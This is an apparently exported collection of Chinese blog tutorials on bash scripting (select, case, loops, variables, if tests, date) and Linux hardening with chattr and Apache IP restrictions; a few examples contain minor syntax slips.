    <content type="text"><![CDATA[shell中的select用法&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;select也是循环的一种，它比较适合用在用户选择的情况下。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;比如，我们有一个这样的需求，运行脚本后，让用户去选择数字，选择1，会运行w命令，选择2运行top命令，选择3运行free命令，选择4退出。脚本这样实现： 1234567891011121314151617181920212223#!/bin/bashecho "Please chose a number, 1: run w, 2: run top, 3: run free, 4: quit"echoselect command in w top free quitdo case $command in w) w ;; top) top ;; free) free ;; quit) exit ;; *) echo "Please input a number:(1-4)." ;; esacdone &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;执行结果如下： 123456789101112131415161718sh select.shPlease chose a number, 1: run w, 2: run top, 3: run free, 4: quit1) w2) top3) free4) quit#? 116:03:40 up 32 days, 2:42, 1 user, load average: 0.01, 0.08, 0.08USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATroot pts/0 61.135.172.68 15:33 0.00s 0.02s 0.00s sh select.sh#? 3 total used free shared buffers cachedMem: 1020328 943736 76592 0 86840 263624-/+ buffers/cache: 593272 427056Swap: 2097144 44196 2052948#? &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我们发现，select会默认把序号对应的命令列出来，每次输入一个数字，则会执行相应的命令，命令执行完后并不会退出脚本。它还会继续让我们再次输如序号。序号前面的提示符，我们也是可以修改的，利用变量PS3即可，再次修改脚本如下： 1234567891011121314151617181920212223#!/bin/bashPS3="Please select a number: "echo "Please chose a number, 1: run w, 2: run top, 3: run free, 4: quit"echoselect command in w top free quitdo case $command in w) w ;; top) top ;; free) free ;; quit) exit ;; *) echo "Please input a number:(1-4)." esacdone &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果想要脚本每次输入一个序号后就自动退出，则需要再次更改脚本如下： 1234567891011121314151617181920212223#!/bin/bashPS3="Please select a number: "echo "Please chose a number, 1: run w, 2: run top, 3: run free, 4: quit"echoselect command in w top free quitdo case $command in w) w;exit ;; top) top;exit ;; free) free;exit ;; quit) exit ;; *) echo "Please input a number:(1-4).";exit esacdone]]></content>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[case 选择]]></title>
    <url>%2F2017%2F08%2F17%2FShell%2F11.%20case%20%E9%80%89%E6%8B%A9%2F</url>
    <content type="text"><![CDATA[case 选择&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在 shell 脚本中，除了用 if 来判断逻辑外，还有一种常用的方式，那就是 case 了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;具体格式： 1234567891011121314case 变量 invalue1) command ;;value2) command ;;value3) command ;;*) Command ;;Esac &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上面的结构中，不限制 value 的个数，* 代表了除了上面的 value 外的其他值。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面来写一个判断输入数值是奇数或者偶数的脚本： 1[root@192 sbin]# vim case.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加入内容： 1234567891011121314#!/bin/bashread -p "Input a number:" na=$[$n%2]case $a in 1) echo "The number is odd." ;; 0) echo "The number is even." ;; *) echo "It's not a number." ;;esac &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;$a 的值为 1 或为 0 ，执行结果为 1[root@192 sbin]# sh case.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;case 脚本常用于编写系统服务的启动脚本。例如 /etc/init.d/iptables 中就用到了。另外有一个知识点，在给出的判断选项，即本例中的 0） 和 1） ，支持写成 1|0） ，意思是当变量 a 的值为 0 或 1 时，只不过在本例中这样的逻辑是不成立的，只是 case 判断脚本支持这样的写法。]]></content>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[shell 中断继续退出]]></title>
    <url>%2F2017%2F08%2F17%2FShell%2F15.%20shell%20%E4%B8%AD%E6%96%AD%E7%BB%A7%E7%BB%AD%E9%80%80%E5%87%BA%2F</url>
    <content type="text"><![CDATA[shell 中断继续退出break 直接结束本层循环：1[root@192 sbin]# vim break.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加入内容： 1234567891011#!/bin/bashfor i in `seq 1 5`do echo $i if [ $i==3 ] then break fi echo $idoneecho aaaaaaa &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;执行结果： 1[root@192 sbin]# sh break.sh continue 忽略 continue 之下的代码，直接进行下一次循环：1[root@192 sbin]# vim continue.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加入内容： 1234567891011#!/bin/bashfor i in `seq 1 5`do echo $i if [ $i == 3 ] then continue fi echo $idoneecho $i &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;执行结果： 1[root@192 sbin]# sh continue.sh exit 直接退出 shell：1[root@192 sbin]# vim exit.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加入内容： 1234567891011#!/bin/bashfor i in `seq 1 5`do echo $i if [ $i == 3 ] then exit fi echo $idoneecho aaaaaaa &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;执行结果： 1[root@192 sbin]# sh exit.sh]]></content>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[shell 自定义变量]]></title>
    <url>%2F2017%2F08%2F17%2FShell%2F8.%20shell%20%E8%87%AA%E5%AE%9A%E4%B9%89%E5%8F%98%E9%87%8F%2F</url>
    <content type="text"><![CDATA[shell 自定义变量&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在 shell 脚本中使用变量显得脚本更加专业更像是一门语言，变量的作用当然不是为了专业。比如写了有一个长达1000行的 shell 脚本，并且脚本中出现了某一个命令或者路径几百次，如果突然发现不对，想换一下，那不是要更改几百次。当然可以用批量替换的命令，但是也很麻烦，并且脚本显得臃肿。变量的作用就是用来解决这个问题。 12[root@192 ~]# cd /usr/local/sbin/[root@192 sbin]# vim variable.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加入内容 12345678#!/bin/bash#In this script we will use variables.d=`date +%H:%M:%S`echo "The script degin at $d."echo "Now we'll sleep 2 seconds."sleep 2d1=`date +%H:%M:%S`echo "The script end at $d1." &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;脚本中使用到了反引号，单引号的作用是执行命令。‘d’ 和 ‘d1’ 在脚本中作为变量出现。定义变量的格式为： 变量名=变量的值，当在脚本中引用变量时需要加上 ‘$’ 符号。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;脚本执行结果： 1[root@192 sbin]# sh variable.sh 数学运算&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在 shell 中经常会用到数学运算，下面示例脚本用来计算两个数字的和。 1[root@192 sbin]# vim sum.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;写入内容 1234567#!/bin/bash#For get the sum of tow numbers. a=1b=2sum=$[$a+$b]echo "$a+$b=$sum" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;数学计算要用 [] 括起来并且外头要带一个 ‘$’ ,脚本结果为： 1[root@192 sbin]# sh sum.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面为几个数学运算相关的例子： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;乘法运算： 1[root@192 sbin]# sh 1.sh 12345#!/bin/basha=3b=2c=$[$a*$b]echo $c &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;除法运算： 1[root@192 sbin]# vim 2.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加入内容： 12345#!/bin/basha=10b=3c=$[$a/$b]echo $c &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;除法运算中 ，c 的结果为 3 ，并不是一个小数，这是因为 shell 默认是不支持小数的。如果想要看小数，需要借助于 bc ，bc 工具是 linux 系统里面的计算器，如果没有就先安装 1[root@192 sbin]# yum install -y bc 12[root@192 sbin]# echo "scale=2;10/3"|bc3.33 和用户交互&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;shell 脚本可以实现，让用户输入一些字符串或者让用户去选择的行为。 1[root@192 sbin]# vim read.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加入内容： 123456#!/bin/bash#Using 'read' in shell script.read -p "Please input a number:" xread -p "Please input another number:" ysum=$[$x+$y]echo "The sum of the two numbers is:$sum" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;read 命令就是用在这样的地方，用于和用户交互。它把用户输入的字符串作为变量值。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;执行脚本 1[root@192 sbin]# sh read.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加上 -x 选项，再来看看这个执行过程： 1[root@192 sbin]# sh -x read.sh shell 脚本预设变量&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有时候会用到这样的命令 /etc/init.d/iptables restart 前面的 /etc/init.d/iptables 文件其实就是一个 shell 脚本，为什么后边可以跟一个 restart ，这里就涉及到了 shell 脚本的 预设变量。实际上， shell 脚本在执行的时候后边是可以跟参数的，而且还可以跟多个。 1[root@192 sbin]# vim option.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加入内容： 123#!/bin/bashsum=$[$1+$2]echo "sum=$sum" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;执行结果为： 1[root@192 sbin]# sh -x option.sh 1 2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在脚本中，会觉得奇怪，哪里来的 $1 和 $2 。这就是 shell 脚本的预设变量，其中 $1 的值就是在执行的时候输入的 1 ，而 $2 的值就是在执行的时候输入的 $2 ，当然一个 shell 脚本的预设变量是没有限制的。另外，还有一个 $0 ，不过它代表的是脚本本身的名字。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改一下脚本： 1[root@192 sbin]# vim option.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;写入内容： 12#!/bin/bashecho "$1 $2 $0" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;执行结果： 1[root@192 sbin]# sh -x option.sh 1 2]]></content>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[if 逻辑判断]]></title>
    <url>%2F2017%2F08%2F17%2FShell%2F9.%20if%20%E9%80%BB%E8%BE%91%E5%88%A4%E6%96%AD%2F</url>
    <content type="text"><![CDATA[if 逻辑判断&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在 shell 脚本中可以使用 if 逻辑判断，只不过它在 shell 中的语法有点奇怪。 1.不带 else&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;格式如下： 123if 判断语句；then command fi &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如 1[root@192 sbin]# vim if1.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加入内容： 123456#!/bin/bashread -p "Please input your scor:" aif((a-lt60))then echo "You didn' pass the exam."fi &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在 if1.sh 中出现了 ((a -lt 60)) 这样的形式，这是 shell 脚本中特有的格式，他等于 if[$a-lt60] ，用一个小括号或者不用都会报错，需要记住这个格式。执行结果为： 1[root@192 sbin]# sh if1.sh 2.带有 else&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;格式如下： 12345if 判断语句；then commandelse commandfi &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如： 1[root@192 sbin]# vim if2.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加入内容： 12345678#!/bin/bashread -p "Please input your score:" aif((a&lt;60))then echo "You didn't pass the exam."else echo "Good! You passed the exam."fi &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;执行结果： 1[root@192 sbin]# sh if2.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;和上例唯一区别的地方是，如果输入大于 60 的数字会有提示。 3.带有 elif&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;格式如下： 1234567if 判断语句；then commandelif 判断语句二；then commandelse commandfi &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如： 1[root@192 sbin]# vim if3.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加入内容: 1234567891011#!/bin/bashread -p "Please input your score:" aif ((a&lt;60))then echo "You didn't pass the exam."elif ((a&gt;=60))&amp;&amp;((a&lt;85))then echo "Good! You pass the exam."else echo "very good! Your score is very high!"fi &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里的 &amp;&amp; 表示 “并且” 的意思，当然也可以使用 || 表示 “或者” &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;执行结果为： 1[root@192 sbin]# sh if3.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在判断数值大小除了可以用 (()) 的形式外，还可以用 [] 但是就不能使用 &gt; 、&lt;、= 这样的符号了，要使用 -lt （小于），-gt（大于），-le（小于等于），-ge（大于等于），-eq（等于），-ne（不等于）。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面以命令行的形式简单比较 12345678[root@192 sbin]# a=10;if [ $a -lt 5 ];then echo ok;fi[root@192 sbin]# a=10;if [ $a -gt 5 ];then echo ok;fi ok[root@192 sbin]# a=10;if [ $a -ge 10 ];then echo ok;fi ok[root@192 sbin]# a=10;if [ $a -eq 10 ];then echo ok;fi ok[root@192 sbin]# a=10;if [ $a -ne 10 ];then echo ok;fi &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;再看看 if 中使用 &amp;&amp; 和 || 的情况： 1234[root@192 sbin]# a=10;if [ $a -lt 1 ]||[ $a -gt 5 ];then echo ok;fi ok[root@192 sbin]# a=10;if [ $a -gt 1 ]||[ $a -lt 10 ];then echo ok;fi ok]]></content>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[shell脚本编程]]></title>
    <url>%2F2017%2F08%2F17%2FShell%2F7.%20shell%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[shell脚本编程1.shell脚本是什么&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;它是一种脚本语言，并非编程语言 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以使用一些逻辑判断、循环等语法 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以自定义子函数 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是系统命令的集合 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;shell脚本可以实现自动化运维，大大增加我们的工作效率 2.shell脚本结构以及执行方法&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;开头行指定bash路径: #! /bin/bash &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以#开头的行作为解释说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;脚本的名字以.sh结尾，用于区分这是一个shell脚本 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;执行方式有两种：chmod +x 1.sh; ./1.sh 如果没有执行权限可以 bash 1.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;bash -x 1.sh 可以查看脚本执行过程 3.学会date命令的用法 date +%Y-%m-%d, date +%y-%m-%d 年月日 date +%H:%M:%S = date +%T 时间 date +%s 时间戳 date -d @1434248742 date -d “+1day”一天后date -d “-1day”一天前 date -d “-1month” 一月前 date -d “-1min” 一分钟前 date +%w, date +%W 星期 4.shell脚本中的变量&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当脚本中使用某个字符串较频繁并且字符串长度很长时就应该使用变量代替&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用条件语句时，常常使用变量 if [ $a -gt 1 ]; then … ; fi &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;引用某个命令的结果时，用变量替代 n=wc -l 1.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;写和用户交互的脚本时，变量也是必不可少的 read -p “Input a number: “ n; echo $n 如果没写这个n，可以直接使用$REPLY &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;内置变量 $0, $1, $2… $0表示脚本本身，$1 第一个参数，$2 第二个 …. $#表示参数个数 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;数学运算a=1;b=2; c=$(($a+$b))或者$[$a+$b] 5.shell中的逻辑判断&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;格式1： 1if 条件 ; then 语句; fi &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;格式2： 1if 条件; then 语句; else 语句; fi &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;格式3： 1if …; then … ;elif …; then …; else …; fi &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;逻辑判断表达式：if [ $a -gt $b ]; if [ $a -lt 5 ]; if [ $b -eq 10 ]等 -gt (&gt;); -lt(&lt;); -ge(&gt;=); -le(&lt;=);-eq(==); -ne(!=) 注意到处都是空格 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以使用 &amp;&amp; || 结合多个条件 6.if 判断文件、目录属性 [ -f file ]判断是否是普通文件，且存在 [ -d file ] 判断是否是目录，且存在 [ -e file ] 判断文件或目录是否存在 [ -r file ] 判断文件是否可读 [ -w file ] 判断文件是否可写 [ -x file ] 判断文件是否可执行 [ -s file ] 判断文件大小是否非0 [ -c file ] 判断文件是否为字符特殊文件，且存在 [ -b file ] 判断文件是否为块特殊文件，且存在 [ -t file ] 判断文件是否为描述符（默认为1）指定的设备为终端 [ -L file ] 判断制定的是否为符号链接 [ “$a” = “$b” ] 判断 $a 和 $b 是否相等 [ -n “$var” ] 判断 $var 变量是否有值 [ -z ] 判断变量是否存在值 [! ] 测试条件的否定符号 1234567891011121314151617181920212223242526272829303132[ -a FILE ] 如果 FILE 存在则为真。 [ -b FILE ] 如果 FILE 存在且是一个块特殊文件则为真。 [ -c FILE ] 如果 FILE 存在且是一个字特殊文件则为真。 [ -d FILE ] 如果 FILE 存在且是一个目录则为真。 [ -e FILE ] 如果 FILE 存在则为真。 [ -f FILE ] 如果 FILE 存在且是一个普通文件则为真。 [ -g FILE ] 如果 FILE 存在且已经设置了SGID则为真。 [ -h FILE ] 如果 FILE 存在且是一个符号连接则为真。 [ -k FILE ] 如果 FILE 存在且已经设置了粘制位则为真。 [ -p FILE ] 如果 FILE 存在且是一个名字管道(F如果O)则为真。 [ -r FILE ] 如果 FILE 存在且是可读的则为真。 [ -s FILE ] 如果 FILE 存在且大小不为0则为真。 [ -t FD ] 如果文件描述符 FD 打开且指向一个终端则为真。 [ -u FILE ] 如果 FILE 存在且设置了SUID (set user ID)则为真。 [ -w FILE ] 如果 FILE 如果 FILE 存在且是可写的则为真。 [ -x FILE ] 如果 FILE 存在且是可执行的则为真。 [ -O FILE ] 如果 FILE 存在且属有效用户ID则为真。 [ -G FILE ] 如果 FILE 存在且属有效用户组则为真。 [ -L FILE ] 如果 FILE 存在且是一个符号连接则为真。 [ -N FILE ] 如果 FILE 存在 and has been mod如果ied since it was last read则为真。 [ -S FILE ] 如果 FILE 存在且是一个套接字则为真。 [ FILE1 -nt FILE2 ] 如果 FILE1 has been changed more recently than FILE2, or 如果 FILE1 exists and FILE2 does not则为真。 [ FILE1 -ot FILE2 ] 如果 FILE1 比 FILE2 要老, 或者 FILE2 存在且 FILE1 不存在则为真。 [ FILE1 -ef FILE2 ] 如果 FILE1 和 FILE2 指向相同的设备和节点号则为真。 [ -o OPTIONNAME ] 如果 shell选项 “OPTIONNAME” 开启则为真。 [ -z STRING ] “STRING” 的长度为零则为真。 [ -n STRING ] or [ STRING ] “STRING” 的长度为非零 non-zero则为真。 [ STRING1 == STRING2 ] 如果2个字符串相同。 “=” may be used instead of “==” for strict POSIX compliance则为真。 [ STRING1 != STRING2 ] 如果字符串不相等则为真。 [ STRING1 &lt; STRING2 ] 如果 “STRING1” sorts before “STRING2” lexicographically in the current locale则为真。 [ STRING1 &gt; STRING2 ] 如果 “STRING1” sorts after “STRING2” lexicographically in the current locale则为真。 [ ARG1 OP ARG2 ] “OP” is one of -eq, -ne, -lt, -le, -gt or -ge. These arithmetic binary operators return true if “ARG1” is equal to, not equal to, less than, less than or equal to, greater than, or greater than or equal to “ARG2”, respectively. “ARG1” and “ARG2” are integers. 7.if 判断一些特殊用法 if [ -z $a ] 这个表示当变量a的值为空时会怎么样 if grep -q ‘123’ 1.txt; then 表示如果1.txt中含有’123’的行时会怎么样 if [ ! -e file ]; then 表示文件不存在时会怎么样 if (($a]]></content>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[date命令]]></title>
    <url>%2F2017%2F08%2F17%2FShell%2F6.%20date%20%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[date命令&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;date 在脚本中用得很多，那必须得学会这个命令，下面是 date 的几种用法： 输出四位的年、月、日，格式 2017.04.27 1[root@192 sbin]# date +%Y-%m-%d 输出两位的年、月、日，格式17-04-27 1[root@192 sbin]# date +%y-%m-%d 另外一种输出年、月、日的方式 1[root@192 sbin]# date +%F 输出时间，格式 02：05：31 1[root@192 sbin]# date +%H:%M:%S 另外一种输出时间的方式，格式同 4 1[root@192 sbin]# date +%T 时间戳 1[root@192 sbin]# date +%s 根据时间戳反向推测时间 1[root@192 sbin]# date -d @1493232796 一天后 1[root@192 sbin]# date -d "+1day" 一天前 1[root@192 sbin]# date -d "-1day" 一月前 1[root@192 sbin]# date -d "-1month" 一分钟前 1[root@192 sbin]# date -d "-1min" 星期 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;小写 w 表示周几 1[root@192 sbin]# date +%w &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;大写 W 表示本年的第几周 1[root@192 sbin]# date +%W]]></content>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[if 判断的几种用法]]></title>
    <url>%2F2017%2F08%2F17%2FShell%2F10.%20if%20%E5%88%A4%E6%96%AD%E7%9A%84%E5%87%A0%E7%A7%8D%E7%94%A8%E6%B3%95%2F</url>
    <content type="text"><![CDATA[if 判断的几种用法1.和文档相关的判断&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;shell 脚本中 if 还经常判断关于档案属性，比如判断是普通文件还是目录，判断文件是否有读写执行权限等。常用的也就几个选项： -e：判断文件或目录是否存在； -d：判断是不是目录，并是否存在；-f：判断是否是普通文件，并存在； -r：判断文档是否有读权限； -w：判断文档是否有写权限； -x：判断是否可执行。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用 if 判断时，具体格式为： 1if [ -e filename ] ;then &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例子: 123[root@192 sbin]# if [ -d /home/ ];then echo ok;fiok[root@192 sbin]# if [ -f /home/ ];then echo ok;fi &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;因为 /home/ 为目录非文件，所以 -f 并不会显示 “ok”。 123456789[root@192 sbin]# if [ -f /home/1.txt ];then echo ok;fi ok[root@192 sbin]# if [ -r /home/1.txt ];then echo ok;fiok[root@192 sbin]# if [ -w /home/1.txt ];then echo ok;fiok[root@192 sbin]# if [ -x /home/1.txt ];then echo ok;fi[root@192 sbin]# if [ -e /home/1.txt ];then echo ok;fiok 2.变量是否为空&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有时候需要判断一个变量的值是否为空，以避免后续操作产生异常。如果不去判断变量是否有值，就接着在后续命令中引用该变量，则会出错。比如下面脚本： 1[root@192 sbin]# vim 3.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加入内容： 123456#!/bin/bashn=`wc -l 1.txt|awk '&#123;print $1&#125;'`if [ $n -gt 10 ]then echo "The file 1.txt has more than 10 lines."fi &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个脚本看上去是没有问题，但没有考虑到 1.txt 文件不存在的情况，如果文件不存在，那么 n 的值也是不存在的。后面的判断也会出错。所以应该先判断一下 n 是否为空。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用下面方法即可： 1[root@192 sbin]# vim 4.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加入内容： 12345678#!/bin/basha=if [ -n "$a" ]then echo "a is not null."else echo "a is null."fi &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-n 选项可以判断一个变量是否不为空，注意一定要把变量引起来，上例用双引号把 $a 引起来了，否则是不对的，还有一个和 -n 正好相对的， -z ，用法如下： 1[root@192 sbin]# vim 5.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加入内容： 123456#!/bin/basha=if [ -z $a ]then echo "a is null."fi &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个 -z 后面的 $a 可以不用双引号引起来。 3.if 判断条件可以是一条命令1[root@192 sbin]# if grep -q '^yanyi:' /etc/passwd;then echo "user yanyi exist.";fi &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;grep -p 选项的作用是，过滤但不输出。用在 if 判断中，不需要输出结果，只需要知道它到底有没有执行成功，也就是说如果 /etc/passwd 文件中含有 yanyi 这个用户，那么条件就成立了。]]></content>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[针对访问 uri 限制 ip]]></title>
    <url>%2F2017%2F08%2F17%2FLinux%E5%AE%89%E5%85%A8%2F15.%20%E9%92%88%E5%AF%B9%E8%AE%BF%E9%97%AE%20uri%20%E9%99%90%E5%88%B6%20ip%2F</url>
    <content type="text"><![CDATA[针对访问 uri 限制 ip&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在虚拟主机配置文件中加入如下字段： 1234Order deny,allowDeny from allAllow from 127.0.0.1Allow from 2.2.2.2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;假如该虚拟机的域名为 domain.com , 这样配置后，除了 127.0.0.1 和 2.2.2.2 外，其他ip访问以下类似的uri时都会直接禁止的。 1234http://domain.com/1212admin.txt http://domain.com/admin.phphttp://domain.com/1212/admin.html等]]></content>
      <tags>
        <tag>Linux安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件系统安全]]></title>
    <url>%2F2017%2F08%2F17%2FLinux%E5%AE%89%E5%85%A8%2F14.%20%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%2F</url>
    <content type="text"><![CDATA[文件系统安全一、锁定系统重要文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;系统运维人员有时候可能会遇到通过root用户都不能修改或者删除某个文件的情况，产生这种情况的大部分原因可能是这个文件被锁定了。在Linux下锁定文件的命令是chattr，通过这个命令可以修改ext2、ext3、ext4文件系统下文件属性，但是这个命令必须有超级用户root来执行。和这个命令对应的命令是lsattr，这个命令用来查询文件属性。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通过chattr命令修改文件或者目录的文件属性能够提高系统的安全性，下面简单介绍下chattr和lsattr两个命令的用法。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;chattr命令的语法格式如下： 1chattr [-RV] [-v version] [mode] 文件或目录 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主要参数含义如下： -R：递归修改所有的文件及子目录。 -V：详细显示修改内容，并打印输出。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中mode部分用来控制文件的属性，常用参数如下表所示： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;参数含义 ：在原有参数设定基础上，追加参数 ：在原有参数设定基础上，移除参数 =：更新为指定参数 a：即append，设定该参数后，只能向文件中添加数据，而不能删除。常用于服务器日志文件安全，只有root用户才能设置这个属性 c：即compresse，设定文件是否经压缩后再存储。读取时需要经过自动解压操作 i ：即immutable，设定文件不能被修改、删除、重命名、设定链接等，同时不能写入或新增内容。这个参数对于文件系统的安全设置有很大帮助 s：安全的删除文件或目录，即文件被删除后硬盘空间被全部收回 u：与s参数相反，当设定为u时，系统会保留其数据块以便以后能够恢复删除这个文件。这些参数中，最常用到的是a和i，a参数常用于服务器日志文件安全设定，而i参数更为严格，不允许对文件进行任何操作，即使是root用户 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;lsattr用来查询文件属性，用法比较简单，其语法格式如下： 1lsattr [-adlRvV] 文件或目录 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;常用参数如下表所示。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;参数含义 -a：列出目录中的所有文件，包括以.开头的文件 -d：显示指定目录的属性 -R：以递归的方式列出目录下所有文件及子目录以及属性值 -v：显示文件或目录版本 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在Linux系统中，如果一个用户以root的权限登录或者某个进程以root的权限运行，那么它的使用权限就不再有任何的限制了。因此，攻击者通过远程或者本地攻击手段获得了系统的root权限将是一个灾难。在这种情况下，文件系统将是保护系统安全的最后一道防线，合理的属性设置可以最大限度地减小攻击者对系统的破坏程度，通过chattr命令锁定系统一些重要的文件或目录，是保护文件系统安全最直接、最有效的手段。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对一些重要的目录和文件可以加上“i”属性，常见的文件和目录有： 12345678chattr -R +i /bin /boot /lib /sbinchattr -R +i /usr/bin /usr/include /usr/lib /usr/sbinchattr +i /etc/passwdchattr +i /etc/shadowchattr +i /etc/hostschattr +i /etc/resolv.confchattr +i /etc/fstabchattr +i /etc/sudoers &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对一些重要的日志文件可以加上“a”属性，常见的有： 12chattr +a /var/log/messageschattr +a /var/log/wtmp 